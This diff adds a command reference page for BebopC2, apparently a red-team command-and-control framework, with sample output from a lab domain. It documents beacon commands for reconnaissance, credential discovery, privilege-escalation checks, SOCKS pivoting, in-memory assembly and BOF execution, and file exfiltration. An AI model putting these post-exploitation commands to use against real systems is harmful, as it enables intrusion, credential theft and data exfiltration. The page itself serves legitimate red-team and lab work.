@@ -1,0 +1,426 @@
+---
+title: Command Reference
+description: Real BebopC2 command behavior and output formats.
+---
+
+# Command Reference
+
+This page tracks the current command handlers in `operator-client/static/js/app/core.js`, `operator-client/static/js/app/terminal.js`, `beacon/src/exec/builtin.c`, `beacon-linux/src/exec/builtin.c`, and `teamserver/server/handlers.go`.
+
+The examples show output shapes. Hostnames, PIDs, paths, sizes, and domain data vary by target.
+
+## Identity / Target
+
+| Command | Behavior |
+| --- | --- |
+| `whoami` | Windows prints current username; Linux prints UID/GID/group context. |
+| `id` | Linux alias for `whoami`. |
+| `hostname` | Print hostname. |
+| `domain` | Print joined domain or workgroup context. |
+| `getpid` | Print current beacon PID. |
+| `getintegrity` | Print Windows integrity level. |
+| `sysinfo` | Print OS, architecture, memory, hostname, and user. |
+| `drives` | List logical drives. |
+| `uptime` | Print system uptime. |
+
+Output:
+
+```text
+[BEBOP ~]$ whoami
+Administrator
+
+[BEBOP ~]$ hostname
+DC
+
+[BEBOP ~]$ domain
+support.htb
+
+[BEBOP ~]$ getpid
+3796
+
+[BEBOP ~]$ getintegrity
+High (RID: 0x3000)
+
+[BEBOP ~]$ sysinfo
+OS:       Microsoft Windows Server 2022 Standard (Build 20348)
+Arch:     x64
+RAM:      4096 MB total / 2210 MB free
+Hostname: DC
+User:     Administrator
+
+[BEBOP ~]$ drives
+C:\  Fixed       59 GB total / 18 GB free
+D:\  CD-ROM
+
+[BEBOP ~]$ uptime
+3 days, 4 hours, 12 minutes, 9 seconds
+```
+
+## Filesystem
+
+| Command | Behavior |
+| --- | --- |
+| `pwd` | Print current working directory. |
+| `cd <path>` | Change current working directory. |
+| `ls [path]` / `dir [path]` | List directory. |
+| `cat <file>` | Read text file content. |
+| `stat <path>` | Print file metadata. |
+| `mkdir <path>` | Create directory. |
+| `rm <file>` | Delete file. |
+| `rmdir <path>` | Remove empty directory. |
+| `cp <src> <dst>` | Copy file. |
+| `mv <src> <dst>` | Move or rename. |
+
+Output:
+
+```text
+[BEBOP ~]$ pwd
+C:\Users\Administrator\Documents
+
+[BEBOP ~]$ ls C:\Users\Public
+<DIR>  Documents
+       readme.txt
+
+[BEBOP ~]$ stat C:\Windows\win.ini
+Path:     C:\Windows\win.ini
+Type:     File
+Size:     92 bytes
+Created:  2024-01-01 10:00:00 UTC
+Modified: 2024-01-01 10:00:00 UTC
+Accessed: 2024-01-01 10:00:00 UTC
+
+[BEBOP ~]$ cat C:\Windows\win.ini
+[fonts]
+[extensions]
+```
+
+Successful `mkdir`, `rm`, `rmdir`, `cp`, and `mv` can be silent. In real-time operator WebSocket mode, a silent result may show:
+
+```text
+[*] task completed (no output)
+```
+
+Errors are explicit:
+
+```text
+ls: cannot access 'C:\Nope\*' (error 3)
+cat: cannot open 'C:\Nope.txt' (error 2)
+cp: failed (error 5)
+```
+
+## Process / Services
+
+| Command | Behavior |
+| --- | --- |
+| `ps` | List processes. |
+| `kill <pid>` | Terminate process. |
+| `services` | List Windows services. |
+| `schtasks-enum [target]` | Enumerate scheduled tasks through built-in BOF. |
+| `safe-harbor` | Run process reconnaissance through built-in BOF. |
+
+Output:
+
+```text
+[BEBOP ~]$ ps
+PID     PPID    Arch  Session  User                 Name
+4       0       x64   0        NT AUTHORITY\SYSTEM  System
+1600    688     x64   0        SUPPORT\Administrator beacon.exe
+
+[BEBOP ~]$ services
+BFE                                       RUNNING   PID 920
+Spooler                                   STOPPED   PID 0
+
+[BEBOP ~]$ kill 1234
+kill: cannot open PID 1234 (error 5)
+```
+
+## Network / Pivoting
+
+| Command | Behavior |
+| --- | --- |
+| `ipconfig` | List adapter addresses. |
+| `ifconfig` | Linux alias for `ipconfig`. |
+| `arp` | List ARP cache. |
+| `netstat` | List TCP/UDP sockets. |
+| `dns <name>` | Resolve hostname. |
+| `xpipe [pipe]` | Enumerate named pipes through built-in BOF. |
+| `curl <url>` | Linux plain HTTP GET helper. |
+| `portscan <host> <ports>` | Linux TCP connect scan helper. |
+| `socks5 start [port]` | Start SOCKS5 proxy. |
+| `socks5 stop` | Stop SOCKS5 proxy. |
+| `interactive` | Start real-time session mode. |
+
+Output:
+
+```text
+[BEBOP ~]$ ipconfig
+
+[Ethernet0]
+  IPv4: 10.10.11.174
+  IPv6: fe80:0000:0000:0000:aaaa:bbbb:cccc:dddd
+
+[BEBOP ~]$ arp
+IP Address        MAC Address           Type
+----------        -----------           ----
+10.10.11.1        00-50-56-b0-01-01     Dynamic
+
+[BEBOP ~]$ netstat
+Proto  Local                Remote               State          PID
+TCP    0.0.0.0:445          0.0.0.0:0            LISTEN         4
+TCP    10.10.11.174:49733   10.10.14.5:8080      ESTABLISHED    3796
+UDP    0.0.0.0:5353         *:*
+
+[BEBOP ~]$ dns dc.support.htb
+  A    10.10.11.174
+```
+
+## Domain / Directory
+
+| Command | Behavior |
+| --- | --- |
+| `ldapsearch <filter> [attrs]` | Run LDAP query through built-in BOF. |
+| `adcs_enum [target]` | Enumerate ADCS through built-in BOF. |
+| `password-policy [server]` | Query password and lockout policy through built-in BOF. |
+| `net-shares [target]` | Enumerate network shares through built-in BOF. |
+| `local-sessions` | Enumerate local/RDP sessions through built-in BOF. |
+| `netloggedon [host]` | Enumerate logged-on users through built-in BOF. |
+
+Built-in BOFs are Windows x64 only and read from `teamserver/resources/bofs/manifest.json`.
+
+Output:
+
+```text
+[BEBOP ~]$ ldapsearch "(objectClass=computer)" dNSHostName
+[*] Distinguished name: DC=support,DC=htb
+[*] targeting DC: \\dc.support.htb
+[*] Binding to dc.support.htb
+[+] Successfully bound to LDAP server
+[*] Filter: (objectClass=computer)
+[*] Returning specific attribute(s): dNSHostName
+
+--------------------
+dNSHostName: dc.support.htb
+retrieved 1 results total
+```
+
+## Privilege / Credentials
+
+| Command | Behavior |
+| --- | --- |
+| `privs` | List token privileges. |
+| `groups` | List current user groups. |
+| `priv-always-install-elevated` | Check AlwaysInstallElevated policy through built-in BOF. |
+| `priv-autologon` | Read Winlogon AutoLogon values through built-in BOF. |
+| `priv-credential-manager` | Query Credential Manager entries through built-in BOF. |
+| `priv-hijackable-path` | Find writable PATH directories through built-in BOF. |
+| `priv-modifiable-autorun` | Find writable autorun executables through built-in BOF. |
+| `priv-modifiable-service` | Find modifiable service permissions through built-in BOF. |
+| `priv-powershell-history` | Locate PSReadLine history through built-in BOF. |
+| `priv-token-privileges` | Print token privileges through built-in BOF. |
+| `priv-uac-status` | Print UAC and integrity status through built-in BOF. |
+| `priv-unquoted-service-path` | Find unquoted service paths through built-in BOF. |
+
+Output:
+
+```text
+[BEBOP ~]$ privs
+  SeChangeNotifyPrivilege                  [Enabled+Default]
+  SeImpersonatePrivilege                   [Enabled]
+
+[BEBOP ~]$ groups
+  Administrators
+  Remote Desktop Users
+```
+
+## Host Data / Registry
+
+| Command | Behavior |
+| --- | --- |
+| `env` | Print environment variables. |
+| `getenv <var>` | Print one environment variable. |
+| `clipboard` | Read clipboard text where supported. |
+| `reg_query <key> <value>` | Read registry value. |
+| `reg_set <key> <value> <data>` | Write `REG_SZ` value. |
+| `regsession [host]` | Enumerate registry session hives through built-in BOF. |
+| `msi-search` | Search cached MSI installer metadata through built-in BOF. |
+
+Output:
+
+```text
+[BEBOP ~]$ getenv USERNAME
+Administrator
+
+[BEBOP ~]$ reg_query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion ProductName
+Microsoft Windows Server 2022 Standard
+
+[BEBOP ~]$ reg_set HKCU\Software\Test Value data
+reg_set: OK
+
+[BEBOP ~]$ clipboard
+(clipboard is empty)
+```
+
+## SQL Server
+
+| Command | Behavior |
+| --- | --- |
+| `sql-1434udp <ip>` | Query SQL Browser UDP metadata through built-in BOF. |
+| `sql-info <server> [db]` | Query SQL Server metadata through built-in BOF. |
+| `sql-whoami <server> [db] [link]` | Print SQL login, user, and roles through built-in BOF. |
+| `sql-impersonate <server> [db]` | Check impersonation rights through built-in BOF. |
+| `sql-links <server> [db] [link]` | Enumerate linked servers through built-in BOF. |
+| `sql-users <server> [db] [link]` | Enumerate database users through built-in BOF. |
+| `sql-databases <server> [db]` | Enumerate databases through built-in BOF. |
+| `sql-tables <server> [db] [link]` | Enumerate tables through built-in BOF. |
+| `sql-columns <server> <table> [db]` | Enumerate columns through built-in BOF. |
+| `sql-rows <server> <table> [db]` | Count rows through built-in BOF. |
+| `sql-search <server> <term> [db]` | Search column names through built-in BOF. |
+| `sql-query <server> <query> [db]` | Run custom query through built-in BOF. |
+| `sql-agentstatus <server> [db]` | Query SQL Agent state through built-in BOF. |
+| `sql-checkrpc <server> [db]` | Check linked-server RPC state through built-in BOF. |
+
+SQL command output comes from the BOF itself. Authentication and reachable servers depend on target context.
+
+## Execution / Modules
+
+| Command | Behavior |
+| --- | --- |
+| `shell <cmd>` | Run through `cmd.exe /c`. |
+| `<program> [args]` | Direct process execution. |
+| `runas <user> <pass> <cmd>` | Start process with alternate credentials. |
+| `execute-assembly [args]` | Pick local `.NET` assembly and run through fork-and-run path. |
+| `execute-assembly <name> [args]` | Run uploaded assembly by name. |
+| `inline-assembly [args]` | Pick local `.NET` assembly and run in-process through loader BOF and managed bridge. |
+| `inline-assembly <name> [args]` | Run uploaded assembly in-process by name. |
+| `bof-execute [args]` | Pick local `.o` or `.obj` and run in-process. |
+| `bof-execute <name.o/name.obj> [args]` | Run uploaded BOF by name. |
+| `triagedirectory [path]` | Linux sensitive-file triage helper. |
+| `ssh <user@host> <cmd>` | Linux wrapper around the target host's `ssh` client. |
+
+Output:
+
+```text
+[BEBOP ~]$ execute-assembly Rubeus.exe
+[*] assembly queued (label: 3827534869, shellcode: 24172 bytes)
+[+] task delivered to beacon
+[+] execute-assembly is working
+[+] hostname: DC
+[+] user: Administrator
+
+[BEBOP ~]$ inline-assembly --mode bridge Rubeus.exe
+[*] inline-assembly queued (label: 4176515639)
+[+] task delivered to beacon
+[inline-assembly]
+Exit: 0
+Duration: 63ms
+Truncated: false
+
+STDOUT:
+[+] execute-assembly is working
+
+[BEBOP ~]$ bof-execute bebop_test_bof.obj adaw
+[*] bof queued (label: 132969452, object: 1194 bytes)
+[+] task delivered to beacon
+Bebop BOF smoke test OK
+Current PID: 3308
+First arg length: 4
+First arg: adaw
+```
+
+Loader errors are direct:
+
+```text
+bof: unresolved symbol: KERNEL32$SetLastError
+bof: unsupported relocation
+Bridge invoke failed (0x8002000e)
+```
+
+## Libraries
+
+| Command | Behavior |
+| --- | --- |
+| `assembly-upload <name>` | Open file picker and upload `.exe` or `.dll` bytes to `~/.bebop/assemblies/`. |
+| `assembly-list` | List uploaded assemblies from `/api/assemblies`. |
+| `assembly-delete <name>` | Delete uploaded assembly by name. |
+| `bof-upload <name.o/name.obj>` | Open file picker and upload `.o` or `.obj` bytes to `~/.bebop/bofs/`. |
+| `bof-list` | List operator and built-in BOFs from `/api/library`. |
+
+Output:
+
+```text
+[BEBOP ~]$ assembly-list
+Assemblies:
+  Rubeus.exe  (462848 bytes)
+
+[BEBOP ~]$ bof-list
+Operator BOFs:
+  bebop_test_bof.obj  (1.2 KB)
+Built-in BOFs:
+  ldapsearch  [ldapsearch.x64.o]  (13.2 KB)
+```
+
+Operator BOFs can be deleted from the Library tab or `/api/library/{name}`. Built-in BOFs are read-only.
+
+## Transfer / Control
+
+| Command | Behavior |
+| --- | --- |
+| `download <remote>` | Exfiltrate remote file into Loot. |
+| `upload <remote>` | Upload selected local file to remote path. |
+| `sleep <sec> [jitter]` | Set callback interval. |
+| `exit` | Terminate beacon. |
+| `help` | Print terminal command help. |
+| `clear` | Clear current terminal view. |
+
+Output:
+
+```text
+[BEBOP ~]$ download C:\Users\Administrator\Documents\loot.txt
+[+] exfil complete: C:\Users\Administrator\Documents\loot.txt
+    check the LOOT tab to download or delete
+
+[BEBOP ~]$ upload C:\Temp\tool.exe
+[*] select file to upload...
+[+] upload complete
+
+[BEBOP ~]$ sleep 5 20
+[+] sleep=5s jitter=20%
+```
+
+Liveness uses `last_seen + sleep + 10 seconds`.
+
+## Linux Utility Set
+
+Linux commands are implemented in `beacon-linux/src/exec/builtin.c`.
+
+```text
+[BEBOP ~]$ hostname
+hostname: web01
+kernel: Linux 6.8.0-31-generic x86_64
+
+[BEBOP ~]$ whoami
+uid=0(root) gid=0(root) euid=0(root) egid=0(root) groups=0(root)
+
+[BEBOP ~]$ ps
+PID      PPID     USER       STATE  COMMAND
+1        0        root       S      /sbin/init
+
+[BEBOP ~]$ ifconfig
+eth0
+  flags: UP RUNNING
+  inet  10.10.11.20/24
+  ether 00:50:56:b0:aa:bb
+
+[BEBOP ~]$ chmod 600 /tmp/key
+chmod: /tmp/key -> 0600
+
+[BEBOP ~]$ portscan 10.10.11.1 22,80,443
+10.10.11.1       22/tcp    open
+Scan complete: 1 open port(s) (1 host(s) scanned)
+```
+
+Linux `curl` supports plain HTTP in the built-in path. HTTPS returns:
+
+```text
+curl: https not supported in builtin, use download
+```
